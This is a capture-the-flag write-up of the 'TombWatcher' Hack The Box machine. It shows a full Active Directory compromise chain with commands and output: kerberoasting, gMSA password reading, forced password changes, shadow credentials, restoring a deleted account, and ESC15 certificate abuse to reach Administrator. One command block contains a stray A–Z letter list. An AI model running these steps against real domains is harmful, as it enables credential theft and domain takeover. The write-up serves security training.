---
title: TombWatcher
layout: post
released: 2025-06-08
creators: Sentinal & mrb3n8132
pwned: true
tags:
  - os/windows
  - diff/medium
category:
  - HTB
description: TombWatcher is yet another assumed breach scenario, staring with Henry's credentials. Henry is able to set an SPN for Alfred so we kerberoast him. Alfred can, through a long chain of ACLs, gain access to John, our user. Using John we enumerate deleted objects and are able to restore a deleted account called cert_admin. Cert_admin can perform ESC15 which we use to gain access as Administrator.
image: https://labs.hackthebox.com/storage/avatars/59c74a969b4fec16cd8072d253ca9917.png
cssclasses:
  - custom_htb
---
![Tombwatcher Icon](https://labs.hackthebox.com/storage/avatars/59c74a969b4fec16cd8072d253ca9917.png)

# Information Gathering
## Assumed Breach
As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: `henry` / `H3nry_987TGV!`
## Scans
As always, we start of with an `nmap` port scan
```bash
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49697/tcp open  unknown
49700/tcp open  unknown
49739/tcp open  unknown
```

# Foothold
As we're provided with `assumed breach credentials` let's do some enumeration

**Command**
```bash
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' get writable --detail
```

**Output**
```html
<SNIP>
distinguishedName: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
servicePrincipalName: WRITE 
```

We can see that we can write an `SPN` for `Alfred` which could potentially allow us to kerberoast `Alfred` if they have a weak password.

So let's give `Alfred` an `SPN`.

**Command**
```bash
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object 'Alfred' servicePrincipalName -v 'w1ld/htb'     
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
```

**Output**
```
[+] Alfred's servicePrincipalName has been updated
```

After giving him an `SPN` he should now be `kerberoastable`, so let's `kerberoast` him

**Command**
```bash
nxc ldap tombwatcher.htb -u henry -p 'H3nry_987TGV!' --kerberoasting kerberoast.txt
```

**Output**
```
LDAP        10.129.252.26   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.129.252.26   389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        10.129.252.26   389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.252.26   389    DC01             [*] Total of records returned 1
LDAP        10.129.252.26   389    DC01             [*] sAMAccountName: Alfred, memberOf: [], pwdLastSet: 2025-05-12 11:17:03.526670, lastLogon: <never>
LDAP        10.129.252.26   389    DC01             $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$db394b4d389eac73e147f6b630e04a2f$275[REDACTED]
```

Using the `TGS` we just grabbed, let's attempt to crack his hash.

**Command**
```bash
hashcat -a 0 -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

**Output**
```
<SNIP>
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$db394b4d389eac73e147f6b630e04a2f$275da38153053e5c7470878a734c7fc424eebaa14256d61d00392071f83d34a[REDACTED]:[REDACTED]
</SNIP>
```

Success! We now have `alfred`'s credentials! `alfred`:`[REDACTED]`

# User
I've done some enumeration starting at a group I'd like to be a member of: `Remote Management Users`. Which has the member `John` whose owner can be written by `Sam`. `Sam`'s password can be forcibly changed by `ansible_dev$` whose `GMSA Password` can be read by `Infrastructure`. Our current user `Alfred` has the permission `WRITE_VALIDATED` on the `Infrastructure` group which allows us to add ourselves. This whole chain of `ACLs` can be read using `bloodhound` but I'll go over the enumeration commands I used to do it manually, as this is always good practice.

Let's start off by taking a look at the `Infrastructure` Group

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASS get object --resolve-sd Infrastructure
```

**Output**
```bash
<SNIP>
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: Alfred
nTSecurityDescriptor.ACL.3.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.3.Flags: CONTAINER_INHERIT
</SNIP>
```

`WRITE_VALIDATED` Access Control Entry allows for the following permissions.
- Self-Membership
- Validated-DNS-Host-Name
- Validated-MS-DS-Additional-DNS-Host-Name
- Validated-MS-DS-Behavior-Version
- Validated-SPN

Since we can add ourselves as member of this group let's do so.

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASS add groupMember Infrastructure 'Alfred'
```

**Output**
```bash
[+] Alfred added to Infrastructure
```

Now that we are a member of the group `Infrastructure` we should be able to read `ansible_dev$`'s `GMSA Managed Password`

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASS get object --resolve-sd 'ansible_dev$'
```

**Output**
```bash
<SNIP>
msDS-GroupMSAMembership.ACL.Type: == ALLOWED ==
msDS-GroupMSAMembership.ACL.Trustee: Infrastructure
msDS-GroupMSAMembership.ACL.Right: GENERIC_ALL
msDS-GroupMSAMembership.ACL.ObjectType: Self
msDS-ManagedPasswordId: AQAAAEtEU0sCAAAAagEAABsAAAAIAAAAc6NtcnDRepr24Tfly34IywAAAAAgAAAAIAAAAHQAbwBtAGIAdwBhAHQAYwBoAGUAcgAuAGgAdABiAAAAdABvAG0AYgB3AGEAdABjAGgAZQByAC4AaAB0AGIAAAA=
</SNIP>
```

So let's read the `GMSA` managed password which should get us Hashes.

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASS get object --resolve-sd 'ansible_dev$' --attr msDS-ManagedPassword
```

**Output**
```bash
distinguishedName: CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:[REDACTED]
msDS-ManagedPassword.B64ENCODED: IIwfpSnxGqOGf+d99xuIBTCl3yqtm6fvywv4pBqe5PN9jsYcLAWn3x1doYf9ZzjBXGB3XoRzPFNwtajDOG304xGmN2CJ4G+5QsLACGGVvu3ZoG4aosUdfpEGuWyYqSyKggtxHtssw1lWLbrZayfWqascdDtBvuaszTpJgmDnLykE6QP+BmmngEkfETLuZ+hH0pP896TujqasQXFyOBkqwVtvXe1Lx9szud4//XTPoejE0KBihHGhzmbQ8pGH9QR9zl21XsohXJA2dd9QAUwgGpCssBhbOPtAalPoaOYDlBE4wrFZNnrYpADsIeYVO/HmXVnGO1e/9XRjcSCEZaHvTw==
```

Success! We got credentials for the `ansible_dev$` account.

Using this account we are able to change `Sam`'s password as shown below.

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p :$HASH get object --resolve-sd Sam
```

**Output**
```html
<SNIP>
nTSecurityDescriptor.ACL.0.Type: == ALLOWED_OBJECT == 
nTSecurityDescriptor.ACL.0.Trustee: ansible_dev$
nTSecurityDescriptor.ACL.0.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.0.ObjectType: User-Force-Change-Password
</SNIP>
```

So let's change `Sam`'s password.

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p :$HASH set password sam 'W1ldP@ss'
```

**Output**
```
[+] Password changed successfully!
```

`Sam` can set `John`'s password, as we can see here.

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASS get writable
```

**Output**
```bash
<SNIP>
distinguishedName: CN=john,CN=Users,DC=tombwatcher,DC=htb
OWNER: WRITE
</SNIP>
```

Another way we can enumerate this is by checking `John`'s `ACLs` manually instead of getting `Sam`'s `Writeable`

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASS get object --resolve-sd 'John'
```

**Output**
```bash
<SNIP>
nTSecurityDescriptor.ACL.9.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.9.Trustee: sam
nTSecurityDescriptor.ACL.9.Right: WRITE_OWNER
nTSecurityDescriptor.ACL.9.ObjectType: Self
</SNIP>
```

So let's set the owner to be `Alfred`, so we don't have to deal with the cleanup script that's cleaning up `Sam`'s password change.

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASS set owner john alfred
```

**Output**
```bash
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by alfred on john
```

Next, let's give ourselves `genericAll` permissions on `John`

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASS add genericAll John Alfred
```

**Output**
```
[+] Alfred has now GenericAll on John
```

Let's do a `shadow` attack.

**Command**
```bash
certipy-ad shadow auto -account 'John' -u $USER -p $PASS -target $DOMAIN -dc-ip $IP
```

**Output**
```bash
[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '28ea39b9-f8ac-0115-6eff-c93cc12be14f'
[*] Adding Key Credential with device ID '28ea39b9-f8ac-0115-6eff-c93cc12be14f' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID '28ea39b9-f8ac-0115-6eff-c93cc12be14f' to the Key Credentials for 'john'
/usr/lib/python3/dist-packages/certipy/lib/certificate.py:519: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': [REDACTED]
```

Success! We now have Credentials for `John`! `John`:`[REDACTED]`

We can `winrm` as he is a member of `Remote Management Users`

**Command**
```bash
evil-winrm -i $DOMAIN -u $USER -H $HASH
```

**Output**
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents>
```

Just like that, we have User!

# Root
Given the box name is `TombWatcher` let's look for `Deleted Objects` using the `Active-Directory` powershell module.

**Command**
```powershell
Get-ADObject -Filter {isDeleted -eq $True -and name -ne "Deleted Objects"} -IncludeDeletedObjects -Properties *
```

**Output**
```html
<SNIP>
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
</SNIP>
```

> Remember to find the `LASTEST` deleted object as the other objects will have had their permissions revoked. I learned this the hard way as I restored the wrong object and was banging my head against the wall because of it.
{:.info}

We can find the object `cert_admin` let's bring it back to life!

**Command**
```powershell
Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
```

John has `GenericAll` on `cert_admin` as we can see here:

**Command**
```bash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p :$HASH get writable
```

**Output**
```html
<SNIP>
distinguishedName: CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

Let's grab some credentials, my go-to when we have `GenericWrite` is always going to be a `Shadow Credentials` attack, other options are: `Kerberoasting` or `Change Password`.

**Command**
```bash
certipy-ad shadow auto -account 'cert_admin' -u $USER -hashes $HASH -target $DOMAIN -dc-ip $IP
```

**Output**
```
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'cert_admin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '1e274ad4-7f3f-c585-0d8b-d8bdf8f66a68'
[*] Adding Key Credential with device ID '1e274ad4-7f3f-c585-0d8b-d8bdf8f66a68' to the Key Credentials for 'cert_admin'
[*] Successfully added Key Credential with device ID '1e274ad4-7f3f-c585-0d8b-d8bdf8f66a68' to the Key Credentials for 'cert_admin'
/usr/lib/python3/dist-packages/certipy/lib/certificate.py:519: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
[*] Authenticating as 'cert_admin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'cert_admin@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'cert_admin.ccache'
[*] Wrote credential cache to 'cert_admin.ccache'
[*] Trying to retrieve NT hash for 'cert_admin'
[*] Restoring the old Key Credentials for 'cert_admin'
[*] Successfully restored the old Key Credentials for 'cert_admin'
[*] NT hash for 'cert_admin': [REDACTED]
```

We have credentials for `cert_admin`! `cert_admin`:`[REDACTED]`

Given that the account is called `cert_admin` I have a suspicion we have privileges over certificate templates and enrollment. Let's use `certipy-ad` to find any vulnerable certificates.

**Command**
```bash
certipy-ad find -u $USER@$DOMAIN -hashes :$HASH -vulnerable
```

If we look through the `txt` file `certipy-ad` wrote, we should find a vulnerability.

```html
<SNIP>
[!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
</SNIP>
```

So we found that the `WebServer` certificate has the `ESC15` vulnerability, which allows us, the enrollee, to supply a `subject` which means we should be able to request a certificate on behalf of the `administrator` as `cert_admin` by supplying the `administrator`'s `UPN`.

**Command**
```bash
certipy-ad -debug req -u $USER@$DOMAIN -hashes $HASH -dc-ip $IP -target $TARGET -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
```

Now there are several methods we can use this `pfx` certificate, we can grab credentials with it using `PKINITtools`, another option is to enter an `ldap shell` and simply change our password.

**Command**
```bash
certipy-ad auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $IP -ldap-shell
```

Now we sould have access to an `ldap shell`, let's change the password of the Administrator account.

**Command**
```ldap
change_password Administrator W1ldP@ss
```

**Output**
```
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: W1ldP@ss
Password changed successfully!
```

We now have `Administrator` credentials, let's `WinRM` into the machine and claim our flags!

**Command**
```bash
evil-winrm -i $DOMAIN -u $USER -p $PASS
```

**Output**
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Just like that we have root!